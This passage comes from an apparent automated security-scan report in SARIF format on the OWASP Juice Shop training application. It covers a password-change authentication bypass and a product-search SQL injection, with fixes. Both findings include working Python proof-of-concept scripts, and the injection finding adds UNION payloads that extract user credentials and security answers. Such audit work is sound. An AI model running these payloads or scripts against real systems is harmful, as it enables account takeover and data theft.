          "ruleId": "CWE-620",
          "level": "error",
          "message": {
            "text": "Authentication Bypass via Missing Current Password Validation in Password Change"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "routes/changePassword.ts"
                },
                "region": {
                  "startLine": 39,
                  "endLine": 42,
                  "snippet": {
                    "text": "if (currentPassword && security.hash(currentPassword) !== loggedInUser.data.password) {\n      res.status(401).send(res.__('Current password is not correct.'))\n      return\n    }"
                  }
                }
              },
              "message": {
                "text": "Conditional current password check that can be bypassed by omitting the parameter"
              }
            }
          ],
          "properties": {
            "security-severity": "8.1",
            "strix": {
              "id": "vuln-0002",
              "severity": "high",
              "cvss": 8.1,
              "timestamp": "2026-05-09 09:46:04 UTC",
              "target": "https://github.com/juice-shop/juice-shop",
              "endpoint": "/rest/user/change-password",
              "method": "GET",
              "cwe": "CWE-620",
              "impact": "An attacker who obtains even momentary access to a user's session token—or who can deliver a CSRF payload to a logged-in victim—can change the victim's password without knowledge of the original password. This leads to complete account takeover: the attacker locks the legitimate user out and gains persistent control of the account, including any associated data, orders, and administrative privileges.",
              "technical_analysis": "The vulnerability exists in `routes/changePassword.ts` at line 39. The relevant code is:\n\n```typescript\nif (currentPassword && security.hash(currentPassword) !== loggedInUser.data.password) {\n  res.status(401).send(res.__('Current password is not correct.'))\n  return\n}\n```\n\nThe condition uses JavaScript's logical AND short-circuit: if `currentPassword` is falsy (empty string, undefined, or null), the entire expression evaluates to false and the block body (which rejects the request) is never executed. The function then proceeds directly to updating the password at line 51.\n\nThe endpoint accepts parameters via GET query string (`query.current`, `query.new`, `query.repeat`), which compounds the risk by making CSRF trivial—a simple image tag or link can trigger the password change in a victim's browser session.\n\nRoot cause: The design conflates \"no current password provided\" with \"current password check passed.\" Proper secure logic must always require and validate the current password before permitting a change.",
              "remediation_steps": "1. Make the current password parameter mandatory. Reject the request with HTTP 401 if `current` is not provided or is empty.\n\n2. Always validate the current password hash against the stored hash before permitting the update. Remove the short-circuit pattern.\n\n3. Change the endpoint from GET to POST to prevent trivial CSRF via URL parameters and to avoid logging credentials in server access logs and browser history.\n\n4. Implement CSRF protection (e.g., anti-CSRF tokens or SameSite cookie enforcement) as defense-in-depth.\n\n5. Consider adding rate limiting on password change attempts to mitigate brute-force scenarios.",
              "poc": {
                "description": "To reproduce:\n\n1. Authenticate as any user and obtain a valid JWT token from the login response.\n2. Issue a GET request to the password change endpoint omitting the `current` parameter entirely:\n   `GET /rest/user/change-password?new=hacked123&repeat=hacked123`\n   Include the Authorization header: `Bearer <token>`\n3. Observe that the response returns HTTP 200 with the updated user object, confirming the password was changed without providing the current password.\n4. Attempt to log in with the new password to confirm account takeover.",
                "script": "import requests\n\nBASE_URL = \"http://localhost:3000\"\n\n# Step 1: Register a test user\nregister_resp = requests.post(f\"{BASE_URL}/api/Users/\", json={\n    \"email\": \"authbypass_test@juice-sh.op\",\n    \"password\": \"OriginalPass123!\",\n    \"passwordRepeat\": \"OriginalPass123!\",\n    \"securityQuestion\": {\"id\": 1, \"question\": \"Your eldest siblings middle name?\"},\n    \"securityAnswer\": \"test\"\n})\nprint(f\"Register: {register_resp.status_code}\")\n\n# Step 2: Login to get token\nlogin_resp = requests.post(f\"{BASE_URL}/rest/user/login\", json={\n    \"email\": \"authbypass_test@juice-sh.op\",\n    \"password\": \"OriginalPass123!\"\n})\ntoken = login_resp.json().get(\"authentication\", {}).get(\"token\", \"\")\nprint(f\"Login: {login_resp.status_code}, token obtained: {bool(token)}\")\n\n# Step 3: Change password WITHOUT providing current password\nchange_resp = requests.get(\n    f\"{BASE_URL}/rest/user/change-password\",\n    params={\"new\": \"HackedPass456!\", \"repeat\": \"HackedPass456!\"},\n    headers={\"Authorization\": f\"Bearer={token}\"}\n)\nprint(f\"Change password (no current): {change_resp.status_code}\")\nprint(f\"Response: {change_resp.text[:200]}\")\n\n# Step 4: Verify login with new password works\nverify_resp = requests.post(f\"{BASE_URL}/rest/user/login\", json={\n    \"email\": \"authbypass_test@juice-sh.op\",\n    \"password\": \"HackedPass456!\"\n})\nprint(f\"Login with new password: {verify_resp.status_code}\")\nif verify_resp.status_code == 200:\n    print(\"CONFIRMED: Password changed without current password - Account Takeover possible\")"
              }
            }
          }
        },
        {
          "ruleId": "CWE-89",
          "level": "error",
          "message": {
            "text": "SQL Injection in Product Search Enables Full Database Extraction"
          },
          "locations": [
            {
              "physicalLocation": {
                "artifactLocation": {
                  "uri": "routes/search.ts"
                },
                "region": {
                  "startLine": 23,
                  "endLine": 23,
                  "snippet": {
                    "text": "models.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`) // vuln-code-snippet vuln-line unionSqlInjectionChallenge dbSchemaChallenge"
                  }
                }
              },
              "message": {
                "text": "Unsanitized user input (req.query.q) interpolated directly into raw SQL LIKE clause"
              }
            }
          ],
          "properties": {
            "security-severity": "7.5",
            "strix": {
              "id": "vuln-0003",
              "severity": "high",
              "cvss": 7.5,
              "timestamp": "2026-05-09 09:46:04 UTC",
              "target": "https://github.com/juice-shop/juice-shop",
              "endpoint": "/rest/products/search",
              "method": "GET",
              "cwe": "CWE-89",
              "impact": "Successful exploitation allows an attacker to:\n\n- Extract the entire database schema via SQLite's `sqlite_master` table\n- Dump all user credentials (emails and MD5 password hashes) from the Users table\n- Access sensitive fields including TOTP secrets, roles, and profile data\n- Extract data from any table in the database including orders, feedback, complaints, and security answers\n- Crack the weak MD5 password hashes offline to obtain plaintext passwords\n- Chain with other application functionality to achieve full account takeover\n\nBusiness impact includes complete data breach of all stored information, regulatory exposure under data protection frameworks, and loss of user trust.",
              "technical_analysis": "The vulnerability resides in `routes/search.ts` at line 23. The search handler uses Sequelize's `sequelize.query()` with a raw SQL string constructed via JavaScript template literals:\n\n```typescript\nmodels.sequelize.query(`SELECT * FROM Products WHERE ((name LIKE '%${criteria}%' OR description LIKE '%${criteria}%') AND deletedAt IS NULL) ORDER BY name`)\n```\n\nThe `criteria` variable is derived from `req.query.q` with only a 200-character length truncation applied (line 22):\n```typescript\ncriteria = (criteria.length <= 200) ? criteria : criteria.substring(0, 200)\n```\n\nRoot cause: The developer used string interpolation for the LIKE pattern instead of Sequelize's parameterized query mechanism. The 200-character limit is not a meaningful security control, as UNION-based injection payloads can easily fit within this constraint.\n\nThe underlying database is SQLite, which supports UNION-based injection, subqueries, and access to the `sqlite_master` metadata table. The application returns query results directly as JSON, making data exfiltration trivial — results from injected UNION SELECT statements are rendered in the HTTP response body alongside (or instead of) legitimate product data.",
              "remediation_steps": "1. Replace the raw SQL query with Sequelize's parameterized query using bind parameters for the LIKE clause:\n\n```typescript\nmodels.sequelize.query(\n  `SELECT * FROM Products WHERE ((name LIKE :criteria OR description LIKE :criteria) AND deletedAt IS NULL) ORDER BY name`,\n  { replacements: { criteria: `%${criteria}%` } }\n)\n```\n\n2. Alternatively, use Sequelize's ORM `findAll` method with the `Op.like` operator, which automatically handles parameterization:\n\n```typescript\nProductModel.findAll({\n  where: {\n    [Op.and]: [\n      { deletedAt: null },\n      { [Op.or]: [\n        { name: { [Op.like]: `%${criteria}%` } },\n        { description: { [Op.like]: `%${criteria}%` } }\n      ]}\n    ]\n  },\n  order: [['name', 'ASC']]\n})\n```\n\n3. Implement strict input validation on the search parameter to reject characters that are not expected in product names (e.g., single quotes, parentheses, semicolons, UNION keyword).\n\n4. Apply the principle of least privilege to the database user to limit accessible tables and operations.\n\n5. Consider implementing a Web Application Firewall rule to detect and block common SQL injection patterns in query parameters.",
              "poc": {
                "description": "To reproduce the UNION-based data extraction:\n\n1. Determine the number of columns in the Products table by iterating UNION SELECT with increasing NULL counts until no error occurs. The Products table has 9 columns.\n2. Craft a search query that closes the LIKE clause and appends a UNION SELECT targeting the Users table.\n3. Send a GET request to `/rest/products/search?q=<payload>` with the injection payload.\n4. The response JSON contains the injected data alongside or instead of product results.\n\nExample payload to extract all user credentials:\n```\n')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--\n```\n\nExample payload to extract the database schema:\n```\n')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--\n```\n\nThe payload works by:\n- `'))` closes the open `'%` and `))` from the LIKE clause\n- `UNION SELECT` appends a second result set\n- `--` comments out the remaining SQL (`AND deletedAt IS NULL) ORDER BY name`)",
                "script": "import requests\nimport json\n\nBASE_URL = \"http://localhost:3000\"\nSEARCH_ENDPOINT = f\"{BASE_URL}/rest/products/search\"\n\n# Payload 1: Extract user credentials (email + password hash)\npayload_users = \"')) UNION SELECT id,email,password,role,'5','6','7','8','9' FROM Users--\"\n\n# Payload 2: Extract database schema\npayload_schema = \"')) UNION SELECT sql,'2','3','4','5','6','7','8','9' FROM sqlite_master--\"\n\n# Payload 3: Extract security answers\npayload_answers = \"')) UNION SELECT id,answer,UserId,'4','5','6','7','8','9' FROM SecurityAnswers--\"\n\n\ndef test_search_sqli(description, payload):\n    print(f\"\\n{'='*60}\")\n    print(f\"Test: {description}\")\n    print(f\"Payload: {payload}\")\n    print(f\"{'='*60}\")\n\n    try:\n        resp = requests.get(SEARCH_ENDPOINT, params={\"q\": payload}, timeout=10)\n        print(f\"Status: {resp.status_code}\")\n\n        if resp.status_code == 200:\n            data = resp.json()\n            results = data.get(\"data\", [])\n            print(f\"[VULNERABLE] Query returned {len(results)} rows\")\n\n            # Display first few results\n            for i, row in enumerate(results[:5]):\n                print(f\"  Row {i+1}: {json.dumps(row, default=str)[:200]}\")\n\n            if len(results) > 5:\n                print(f\"  ... and {len(results) - 5} more rows\")\n            return True\n        else:\n            print(f\"Response: {resp.text[:300]}\")\n            return False\n    except requests.RequestException as e:\n        print(f\"Connection error: {e}\")\n        return False\n\n\ndef main():\n    print(\"SQL Injection - UNION-Based Data Extraction PoC\")\n    print(\"Target: OWASP Juice Shop Product Search\")\n\n    results = []\n    results.append(test_search_sqli(\"Extract user credentials\", payload_users))\n    results.append(test_search_sqli(\"Extract database schema\", payload_schema))\n    results.append(test_search_sqli(\"Extract security answers\", payload_answers))\n\n    print(f\"\\n\\nSummary: {sum(results)}/{len(results)} payloads succeeded\")\n    if any(results):\n        print(\"[CRITICAL] UNION SQL Injection confirmed - full database extraction possible\")\n\n    return 0 if any(results) else 1\n\n\nif __name__ == \"__main__\":\n    raise SystemExit(main())"
              }
            }
          }
        },
        {
          "ruleId": "CWE-918",
          "level": "error",
          "message": {
